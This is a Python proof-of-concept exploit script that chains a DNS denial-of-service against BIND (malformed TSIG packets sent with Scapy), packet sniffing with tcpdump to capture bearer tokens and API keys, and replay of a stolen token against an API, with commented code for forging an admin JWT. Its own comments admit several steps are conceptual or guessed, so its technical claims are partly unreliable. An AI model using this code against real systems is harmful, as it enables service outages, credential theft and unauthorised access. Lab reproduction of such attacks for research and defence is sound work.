# main.py - PoC Exploit for NHI Secret Manipulation via DNS DoS

# Project Objective:
# Demonstrate how a DNS DoS can disrupt NHI secret rotation, leading to exposure
# or misuse of static/fallback NHIs, bypassing zero-trust policies.

# Phase 1: Trigger DNS Server Crash
# Goal: Use Scapy to send malformed TSIG DNS queries to a target BIND server.
# This should cause a DoS (assertion failure) in BIND 9.20.0.

import scapy.all as scapy
import time
import subprocess
import os
import json
import jwt # For simulating JWTs

# --- Configuration ---
TARGET_DNS_IP = "172.18.0.2" # Example IP for Dockerized BIND server
TARGET_API_IP = "172.18.0.3" # Example IP for Dockerized mock API
SECRETS_MANAGER_IP = "172.18.0.4" # Example IP for Dockerized mock secrets manager

# Placeholder for the known vulnerable TSIG algorithm ID for CVE-2025-40775
# If this CVE is hypothetical, this ID needs to be carefully chosen or the exploit
# adapted for a known BIND TSIG vulnerability (e.g., a fuzzed value causing crash).
INVALID_TSIG_ALGORITHM_ID = 255 # Often used for "private use" or invalid IDs

# --- Phase 1: Trigger DNS Server Crash ---
def trigger_dns_crash(target_ip):
    print(f"[Phase 1] Attempting to crash BIND DNS server at {target_ip}...")
    try:
        # Construct the malformed DNS query with an invalid TSIG algorithm
        # This payload is conceptual and would need precise tuning for a real CVE.
        dns_query = scapy.DNSQR(qname="test.example.com", qtype="A")
        tsig = scapy.TSIG(
            rrname=".", # TSIG name often '.' for server-to-server or signed updates
            algorithm=INVALID_TSIG_ALGORITHM_ID,
            time=int(time.time()),
            fudge=300, # 5 minutes
            mac_size=0, # MAC will be invalid due to algorithm, size could be anything
            mac="",
            original_id=0,
            error=0,
            other_len=0,
            other=""
        )
        dns_packet = scapy.IP(dst=target_ip)/scapy.UDP(dport=53)/scapy.DNS(qd=dns_query, ar=tsig)

        # Send the packet (UDP, no response expected if it crashes)
        scapy.send(dns_packet, verbose=False, count=100) # Send multiple for impact
        print(f"[Phase 1] Sent malformed TSIG packets to {target_ip}. DNS server should be crashing or become unresponsive.")
        time.sleep(5) # Give some time for DNS to crash
    except Exception as e:
        print(f"[Phase 1] Error sending DNS packets: {e}")

# --- Phase 2: Exploit NHI Secret Rotation Failures ---
def monitor_and_capture_nhis():
    print("[Phase 2] Starting network capture with tcpdump to monitor for NHI secrets...")
    # This tcpdump command will run in the background.
    # IMPORTANT: Adjust interface name (eth0) based on your Docker network setup.
    # This filter aims to capture POST requests over port 443, assuming potential plaintext
    # or easily extractable data during failures. In reality, you'd need to decrypt TLS
    # or target non-TLS traffic.
    pcap_file = "nhis.pcap"
    tcpdump_cmd = [
        "sudo", "tcpdump", "-i", "eth0",
        "port 443 and (tcp[((tcp[12:1] & 0xf0) >> 4)*4:4] = 0x504f5354)", # Filter for POST
        "-w", pcap_file, "-n", "-s0" # No name resolution, full packet capture
    ]

    try:
        # Start tcpdump in a subprocess
        tcpdump_process = subprocess.Popen(tcpdump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"[Phase 2] tcpdump started, capturing to {pcap_file}. Run client/secrets manager simulation now.")

        # Simulate NHI client attempting rotation here
        # This part would call a separate client simulation script or function.
        # For a full PoC, you'd integrate the client that tries to rotate secrets
        # and falls back to static ones when DNS is down.
        # Example: simulate_nhi_client_rotation()

        print("[Phase 2] Simulating NHI client trying to rotate secrets (expecting failures due to DNS DoS)...")
        # In a real scenario, you'd have your simulated client here
        # E.g., `os.system(f"python3 client_nhi_rotation.py --secrets-manager-ip {SECRETS_MANAGER_IP}")`
        time.sleep(30) # Let capture run for a bit while client retries

        print("[Phase 2] Stopping tcpdump capture.")
        tcpdump_process.terminate()
        stdout, stderr = tcpdump_process.communicate(timeout=5)
        if stdout: print(f"tcpdump stdout:\n{stdout.decode()}")
        if stderr: print(f"tcpdump stderr:\n{stderr.decode()}")

        print(f"[Phase 2] Analyzing {pcap_file} for captured NHIs (manual step or using scapy.rdpcap).")
        # You'd then parse the pcap for relevant data.
        # Example (conceptual):
        # packets = scapy.rdpcap(pcap_file)
        # for packet in packets:
        #     if packet.haslayer(scapy.Raw):
        #         raw_data = packet[scapy.Raw].load.decode(errors='ignore')
        #         if "Authorization: Bearer" in raw_data or "api_key=" in raw_data:
        #             print(f"Potential NHI found: {raw_data}")

    except FileNotFoundError:
        print("[ERROR] tcpdump command not found. Ensure tcpdump is installed and in PATH.")
    except Exception as e:
        print(f"[ERROR] An error occurred during tcpdump operation: {e}")

# --- Phase 3: Bypass Zero-Trust Policies ---
def bypass_zero_trust_with_nhi(stolen_nhi_token):
    print(f"[Phase 3] Attempting to bypass Zero-Trust using stolen NHI: {stolen_nhi_token[:20]}...")
    try:
        # Simulate forging a JWT if the stolen_nhi is a signing key (more advanced)
        # For this example, assume stolen_nhi_token is already the 'bearer' token or API key
        if stolen_nhi_token.startswith("eyJ"): # Simple check for JWT structure
            print("[Phase 3] Treating stolen NHI as a JWT token.")
            # Verify the token (if we had the public key/secret) - conceptual
            # decoded_token = jwt.decode(stolen_nhi_token, "your-secret", algorithms=["HS256"])
            # print(f"Decoded JWT: {decoded_token}")

        # Use requests to simulate curl
        import requests
        headers = {
            "Authorization": f"Bearer {stolen_nhi_token}",
            "Content-Type": "application/json"
        }
        # Assuming a mock API is running on TARGET_API_IP
        api_url = f"http://{TARGET_API_IP}:5000/v1/secrets" # Mock API endpoint

        print(f"[Phase 3] Sending authenticated request to {api_url}...")
        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            print(f"[Phase 3] Successfully accessed restricted API! Response: {response.json()}")
            print("[Phase 3] Zero-Trust policy bypassed.")
        else:
            print(f"[Phase 3] Failed to access restricted API. Status: {response.status_code}, Response: {response.text}")
            print("[Phase 3] Zero-Trust bypass attempt failed (or NHI was invalid/expired).")

    except ImportError:
        print("[ERROR] 'requests' library not found. Install with 'pip install requests PyJWT'.")
    except Exception as e:
        print(f"[Phase 3] Error during API access: {e}")

# --- Main Execution Flow ---
if __name__ == "__main__":
    print("--- Starting NHI Zero-Trust Bypass PoC ---")

    # Ensure Docker containers are up before running this script
    print("\n[INFO] Please ensure your Docker environment (BIND, Secrets Manager, Mock API) is running.")
    print("       You may need to run 'docker-compose up -d' first.")
    input("Press Enter to continue after verifying Docker containers are running...")

    # Phase 1
    trigger_dns_crash(TARGET_DNS_IP)

    # Phase 2
    monitor_and_capture_nhis()
    print("\n[INFO] Manual step: Review nhis.pcap for captured secrets. If a secret is found, provide it for Phase 3.")
    # For demonstration, let's assume we "found" a static key for now
    # In a real PoC, you'd parse the pcap or have the client script expose it.
    assumed_stolen_nhi = "stolen_api_key_from_fallback_mechanism_XYZ123ABC" # Replace with actual captured key if possible
    # Or, if simulating JWTs and a signing key was "leaked"
    # signing_secret = "your_secret_key_for_jwt"
    # assumed_stolen_jwt = jwt.encode({"role": "admin", "exp": time.time() + 3600}, signing_secret, algorithm="HS256")
    # print(f"Simulated forged JWT: {assumed_stolen_jwt}")


    if assumed_stolen_nhi:
        # Phase 3
        bypass_zero_trust_with_nhi(assumed_stolen_nhi)
    else:
        print("[Phase 3] No NHI found or provided. Cannot proceed with Zero-Trust bypass.")

    print("\n--- PoC Execution Complete ---")